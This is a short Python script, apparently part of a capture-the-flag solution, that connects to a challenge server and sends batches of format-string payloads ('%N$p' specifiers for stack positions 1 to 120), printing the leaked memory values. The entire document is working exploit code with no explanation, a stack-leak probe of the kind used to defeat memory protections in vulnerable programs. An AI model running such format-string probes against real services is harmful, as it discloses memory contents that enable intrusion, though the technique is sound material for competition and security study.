import socket,time,sys
HOST=('0.cloud.chals.io',23023)
def one(p,tm=.3):
 s=socket.create_connection(HOST,timeout=3); s.settimeout(tm); s.recv(99); s.sendall(p+b'\n'); out=b''
 try:
  while 1:
   d=s.recv(65536)
   if not d: break
   out+=d
   if out.endswith(b'> '): break
 except Exception as e: pass
 s.close(); return out[:-2] if out.endswith(b'> ') else out
for st in range(1,121,10):
 p=b'|'.join(f'%{i}$p'.encode() for i in range(st,st+10))
 print(st,one(p))
